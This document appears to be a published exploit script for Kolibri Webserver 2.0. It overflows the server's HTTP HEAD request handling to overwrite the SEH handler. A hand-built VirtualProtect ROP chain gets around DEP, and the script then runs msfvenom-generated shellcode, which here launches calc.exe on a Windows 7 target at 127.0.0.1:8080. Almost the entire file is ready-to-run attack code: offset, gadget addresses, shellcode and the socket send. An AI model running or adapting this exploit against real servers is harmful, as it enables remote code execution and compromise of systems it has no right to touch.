#!/usr/bin/env python2

# Exploit Title: Kolibri Webserver 2.0 SEH (ASLR+DEP enabled)
# Date: 02/20/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A

import socket
import sys
import logging
import struct

# EAX = ptr to &VirtualProtect()
# ECX = lpOldProtect (ptr to W address)
# EDX = NewProtect (0x40)
# EBX = dwSize
# ESP = lPAddress (automatic)
# EBP = POP (skip 4 bytes)
# ESI = ptr to JMP [EAX]
# EDI = ROP NOP (RETN)
# pushad
# jmp esp

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      # ESI 
      0x77bb1f08,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0x77bb12cc,  # ptr to &VirtualProtect() [IAT RPCRT4.dll] ** ASLR
      0x77c18a4e,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] ** ASLR 
      0x77bdaf61,  # XCHG EAX,ESI # RETN [RPCRT4.dll] ** ASLR 


      # Prepare EDX with NewProtect
      0x77bb1f08,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0xffffffC0,  # Value -40
      0x77c3e369,  # NEG EAX # RETN   ** [RPCRT4.dll] **
      0x77c393fa,  # XCHG EAX,EDX # RETN    ** [RPCRT4.dll] ** 

      # Prepare EBX with size (0x201)
      0x77bb1f08,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0xfffffCff,  # Value -201
      0x77c3e369,  # NEG EAX # RETN   ** [RPCRT4.dll] **
      0x77c39406,  # XCHG EAX,EBX # RETN    ** [RPCRT4.dll] **  

      # EcX <- lpOldProtect
      0x77c272e7,  # POP ECX # RETN [RPCRT4.dll] ** ASLR 
      0x77c482b8,  # &Writable location [RPCRT4.dll] ** ASLR

      # EDI <- RETN address (to help in executing the ROP chain after pushad
      0x77c08b73,  # POP EDI # RETN [RPCRT4.dll] ** ASLR 
      0x77c47221,  # RETN (ROP NOP) [RPCRT4.dll] ** ASLR

      # EAX <- some NOP (they will be just before the shellcode)
      0x77c412a0,  # POP EAX # RETN [RPCRT4.dll] ** ASLR 
      0x90909090,  # nop

      # EBP <- jmp esp address
      0x77bcd2da,  # POP EBP # RETN [RPCRT4.dll] ** ASLR 
      0x77bf1eae,  # & call esp [RPCRT4.dll] ** ASLR

      # final PUSHAD
      0x77bec0fd,  # PUSHAD # RETN [RPCRT4.dll] ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



# Offset calculated with mona pattern_create and mona pattern_offset
offset=515

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d\x20" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbe\x8d\xe7\xa4\x97\xdb\xdb\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x31\x83\xef\xfc\x31\x77\x0f"
shellcode += b"\x03\x77\x82\x05\x51\x6b\x74\x4b\x9a\x94\x84"
shellcode += b"\x2c\x12\x71\xb5\x6c\x40\xf1\xe5\x5c\x02\x57"
shellcode += b"\x09\x16\x46\x4c\x9a\x5a\x4f\x63\x2b\xd0\xa9"
shellcode += b"\x4a\xac\x49\x89\xcd\x2e\x90\xde\x2d\x0f\x5b"
shellcode += b"\x13\x2f\x48\x86\xde\x7d\x01\xcc\x4d\x92\x26"
shellcode += b"\x98\x4d\x19\x74\x0c\xd6\xfe\xcc\x2f\xf7\x50"
shellcode += b"\x47\x76\xd7\x53\x84\x02\x5e\x4c\xc9\x2f\x28"
shellcode += b"\xe7\x39\xdb\xab\x21\x70\x24\x07\x0c\xbd\xd7"
shellcode += b"\x59\x48\x79\x08\x2c\xa0\x7a\xb5\x37\x77\x01"
shellcode += b"\x61\xbd\x6c\xa1\xe2\x65\x49\x50\x26\xf3\x1a"
shellcode += b"\x5e\x83\x77\x44\x42\x12\x5b\xfe\x7e\x9f\x5a"
shellcode += b"\xd1\xf7\xdb\x78\xf5\x5c\xbf\xe1\xac\x38\x6e"
shellcode += b"\x1d\xae\xe3\xcf\xbb\xa4\x09\x1b\xb6\xe6\x47"
shellcode += b"\xda\x44\x9d\x25\xdc\x56\x9e\x19\xb5\x67\x15"
shellcode += b"\xf6\xc2\x77\xfc\xb3\x3d\x32\x5d\x95\xd5\x9b"
shellcode += b"\x37\xa4\xbb\x1b\xe2\xea\xc5\x9f\x07\x92\x31"
shellcode += b"\xbf\x6d\x97\x7e\x07\x9d\xe5\xef\xe2\xa1\x5a"
shellcode += b"\x0f\x27\xc2\x3d\x83\xab\x2b\xd8\x23\x49\x34"


rop_chain = create_rop_chain()

seh = 0x77c1ac5e

payload1 ="A"*(offset)
payload1 += "\x5e\xac\xc1\x77"  # pop pop ret
payload1 += "\xcc"*8
payload1 += rop_chain
payload1 += "\x90"*10
payload1 += shellcode
payload1 += "E"*(100-len(rop_chain))


buffer = (
"HEAD /" + payload1 + " HTTP/1.1\r\n"
"Host: 127.0.0.1:8080\r\n"
"User-Agent: " + "Exploit Writer" + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("127.0.0.1", 8080))
expl.send(buffer)
expl.close()